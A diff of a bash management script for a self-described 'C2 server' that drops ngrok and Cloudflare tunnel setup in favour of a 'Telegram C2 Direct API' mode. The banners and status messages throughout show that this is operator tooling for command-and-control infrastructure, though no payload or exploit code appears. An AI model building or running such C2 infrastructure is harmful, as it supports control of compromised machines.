@@ -89,9 +89,7 @@ server_start() {
     if [ -f "$PID_FILE" ] && kill -0 $(cat "$PID_FILE") 2>/dev/null; then
         echo -e "${GREEN}✓ Server started (PID: $(cat $PID_FILE))${NC}"
         echo -e "${CYAN}  Local: http://127.0.0.1:$PORT${NC}"
-        
-        # Start ngrok automatically
-        ngrok_start
+        echo -e "${CYAN}  Telegram C2: Direct API (no tunnel needed)${NC}"
     else
         echo -e "${RED}✗ Failed to start server${NC}"
         tail -20 "$LOG_FILE"
@@ -101,9 +99,6 @@ server_start() {
 
 server_stop() {
     echo -e "${YELLOW}Stopping server...${NC}"
-    
-    # Stop ngrok first
-    ngrok_stop
     
     # Kill Python server
     if [ -f "$PID_FILE" ]; then
@@ -140,19 +135,10 @@ server_status() {
         [ -f "$PID_FILE" ] && rm -f "$PID_FILE"
     fi
     
-    # Ngrok status
+    # Telegram C2 status
     echo ""
-    ngrok_status
-    
-    # Tunnel status
-    echo ""
-    echo -e "${CYAN}Cloudflare Tunnel Status:${NC}"
-    if pgrep -f "cloudflared tunnel run" > /dev/null; then
-        echo -e "${GREEN}✓ Running${NC}"
-        echo -e "  Public: https://$DOMAIN"
-    else
-        echo -e "${YELLOW}✗ Not running${NC}"
-    fi
+    echo -e "${CYAN}Telegram C2 Status:${NC}"
+    echo -e "${GREEN}✓ Direct API mode (no tunnel needed)${NC}"
 }
 
 server_logs() {
@@ -164,216 +150,23 @@ server_logs() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# NGROK COMMANDS
+# TELEGRAM C2 - Direct API (no tunnel needed)
 # ─────────────────────────────────────────────────────────────────────────────
 
-ngrok_start() {
-    echo -e "${YELLOW}Starting ngrok tunnel...${NC}"
-    
-    # Kill ALL existing ngrok processes completely
-    pkill -9 -f "ngrok" 2>/dev/null || true
-    killall -9 ngrok 2>/dev/null || true
-    sleep 2
-    
-    # Check if ngrok is installed
-    if ! command -v ngrok &> /dev/null; then
-        echo -e "${RED}✗ ngrok not installed. Run: snap install ngrok${NC}"
-        return 1
-    fi
-    
-    # Start ngrok fresh
-    mkdir -p "$SCRIPT_DIR/logs"
-    nohup ngrok http $PORT --authtoken "$NGROK_AUTHTOKEN" > "$NGROK_LOG_FILE" 2>&1 &
-    echo $! > "$NGROK_PID_FILE"
-    
-    sleep 4
-    
-    # Get public URL
-    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('tunnels',[]); print(t[0].get('public_url','') if t else '')" 2>/dev/null || true)
-    
-    if [ -n "$NGROK_URL" ]; then
-        echo -e "${GREEN}✓ Ngrok started${NC}"
-        echo -e "${CYAN}  Public: $NGROK_URL${NC}"
-    else
-        echo -e "${GREEN}✓ Ngrok started${NC}"
-        echo -e "${CYAN}  Check status at: http://127.0.0.1:4040${NC}"
-    fi
-}
-
-ngrok_stop() {
-    echo -e "${YELLOW}Stopping ngrok...${NC}"
-    
-    pkill -f "ngrok http" 2>/dev/null || true
-    rm -f "$NGROK_PID_FILE" 2>/dev/null
-    
-    echo -e "${GREEN}✓ Ngrok stopped${NC}"
-}
-
-ngrok_status() {
-    echo -e "${CYAN}Ngrok Status:${NC}"
-    
-    if pgrep -f "ngrok http" > /dev/null; then
-        echo -e "${GREEN}✓ Running${NC}"
-        
-        # Get public URL
-        NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('tunnels',[]); print(t[0].get('public_url','') if t else '')" 2>/dev/null || true)
-        
-        if [ -n "$NGROK_URL" ]; then
-            echo -e "${CYAN}  Public: $NGROK_URL${NC}"
-        fi
-    else
-        echo -e "${YELLOW}✗ Not running${NC}"
-    fi
+telegram_status() {
+    echo -e "${CYAN}Telegram C2 Status:${NC}"
+    echo -e "${GREEN}✓ Direct API mode${NC}"
+    echo -e "${CYAN}  No tunnel or public URL needed${NC}"
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# TUNNEL COMMANDS
+# INSTALLATION
 # ─────────────────────────────────────────────────────────────────────────────
 
-tunnel_install() {
-    show_banner
-    echo -e "${YELLOW}Installing cloudflared...${NC}"
-    
-    if ! command -v cloudflared &> /dev/null; then
-        if command -v apt &> /dev/null; then
-            curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -o /tmp/cloudflared.deb
-            sudo dpkg -i /tmp/cloudflared.deb 2>/dev/null || sudo apt-get install -f -y
-        elif command -v dnf &> /dev/null; then
-            sudo dnf install -y cloudflared
-        else
-            mkdir -p ~/.local/bin
-            curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ~/.local/bin/cloudflared
-            chmod +x ~/.local/bin/cloudflared
-        fi
-    fi
-    
-    echo -e "${GREEN}✓ cloudflared installed${NC}"
-    
-    # Login if needed
-    if [ ! -f ~/.cloudflared/cert.pem ]; then
-        echo -e "${YELLOW}Logging into Cloudflare...${NC}"
-        echo -e "${YELLOW}A browser will open. Please authenticate.${NC}"
-        cloudflared tunnel login
-    fi
-    
-    echo -e "${GREEN}✓ Authenticated${NC}"
-    
-    # Create tunnel if needed
-    TUNNEL_ID=$(cloudflared tunnel list 2>/dev/null | grep "$TUNNEL_NAME" | awk '{print $1}' || true)
-    
-    if [ -z "$TUNNEL_ID" ]; then
-        echo -e "${YELLOW}Creating tunnel '$TUNNEL_NAME'...${NC}"
-        cloudflared tunnel create "$TUNNEL_NAME"
-        TUNNEL_ID=$(cloudflared tunnel list | grep "$TUNNEL_NAME" | awk '{print $1}')
-    fi
-    
-    echo -e "${GREEN}✓ Tunnel: $TUNNEL_NAME ($TUNNEL_ID)${NC}"
-    
-    # Configure DNS
-    echo -e "${YELLOW}Configuring DNS...${NC}"
-    cloudflared tunnel route dns "$TUNNEL_NAME" "$DOMAIN" 2>/dev/null || true
-    cloudflared tunnel route dns "$TUNNEL_NAME" "www.$DOMAIN" 2>/dev/null || true
-    
-    # Create config
-    mkdir -p ~/.cloudflared
-    cat > ~/.cloudflared/config.yml << EOF
-tunnel: $TUNNEL_ID
-credentials-file: ~/.cloudflared/$TUNNEL_ID.json
-
-ingress:
-  - hostname: $DOMAIN
-    service: http://localhost:$PORT
-  - hostname: www.$DOMAIN
-    service: http://localhost:$PORT
-  - service: http_status:404
-EOF
-    
-    echo -e "${GREEN}✓ Config created${NC}"
-    
-    # Create systemd service
-    cat > /tmp/cloudflared.service << EOF
-[Unit]
-Description=Cloudflare Tunnel for $DOMAIN
-After=network.target
-
-[Service]
-Type=simple
-User=$USER
-ExecStart=$(command -v cloudflared) tunnel run $TUNNEL_NAME
-Restart=always
-RestartSec=5
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    
-    echo ""
-    echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║              TUNNEL SETUP COMPLETE!${NC}"
-    echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
-    echo ""
-    echo -e "Domain:   ${GREEN}https://$DOMAIN${NC}"
-    echo -e "Tunnel:   ${GREEN}$TUNNEL_NAME${NC}"
-    echo ""
-    echo -e "${YELLOW}Auto-start on boot:${NC}"
-    echo "  sudo cp /tmp/cloudflared.service /etc/systemd/system/"
-    echo "  sudo systemctl enable --now cloudflared"
-}
-
-tunnel_start() {
-    echo -e "${YELLOW}Starting tunnel...${NC}"
-    
-    # Check if tunnel exists
-    if ! cloudflared tunnel list 2>/dev/null | grep -q "$TUNNEL_NAME"; then
-        echo -e "${RED}✗ Tunnel not configured. Run: $0 tunnel install${NC}"
-        return 1
-    fi
-    
-    # Kill existing
-    pkill -f "cloudflared tunnel run" 2>/dev/null || true
-    sleep 1
-    
-    # Start tunnel
-    cloudflared tunnel run "$TUNNEL_NAME" &
-    TUNNEL_PID=$!
-    
-    sleep 2
-    
-    if kill -0 "$TUNNEL_PID" 2>/dev/null; then
-        echo -e "${GREEN}✓ Tunnel started (PID: $TUNNEL_PID)${NC}"
-        echo -e "${CYAN}  Public: https://$DOMAIN${NC}"
-    else
-        echo -e "${RED}✗ Failed to start tunnel${NC}"
-        return 1
-    fi
-}
-
-tunnel_stop() {
-    echo -e "${YELLOW}Stopping tunnel...${NC}"
-    pkill -f "cloudflared tunnel run" 2>/dev/null || true
-    echo -e "${GREEN}✓ Tunnel stopped${NC}"
-}
-
-tunnel_quick() {
-    echo -e "${YELLOW}Starting quick tunnel (temporary URL)...${NC}"
-    pkill -f "cloudflared tunnel --url" 2>/dev/null || true
-    sleep 1
-    
-    cloudflared tunnel --url "http://localhost:$PORT" 2>&1 | tee /tmp/tunnel.log &
-    
-    echo -e "${YELLOW}Waiting for URL...${NC}"
-    sleep 5
-    
-    URL=$(grep -o 'https://[^ ]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
-    
-    if [ -n "$URL" ]; then
-        echo ""
-        echo -e "${GREEN}✓ Quick tunnel created!${NC}"
-        echo -e "${CYAN}  Public: $URL${NC}"
-        echo "$URL" > /tmp/tunnel_url.txt
-    else
-        echo -e "${RED}✗ Failed to get URL${NC}"
-    fi
+install_deps() {
+    echo -e "${YELLOW}Installing dependencies...${NC}"
+    pip install -r "$SCRIPT_DIR/requirements.txt"
+    echo -e "${GREEN}✓ Dependencies installed${NC}"
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -385,20 +178,17 @@ start_all() {
     server_stop
     sleep 1
     server_start
-    sleep 2
-    tunnel_start
     echo ""
     echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║  C2 SERVER + TUNNEL RUNNING!                         ║${NC}"
+    echo -e "${GREEN}║  C2 SERVER RUNNING (Telegram C2 Direct API)          ║${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
     echo ""
-    echo -e "  Public:  ${GREEN}https://$DOMAIN${NC}"
     echo -e "  Local:   ${CYAN}http://localhost:$PORT${NC}"
+    echo -e "  C2:      ${GREEN}Telegram API (no tunnel needed)${NC}"
 }
 
 stop_all() {
     show_banner
-    tunnel_stop
     server_stop
     echo -e "${GREEN}✓ All stopped${NC}"
 }
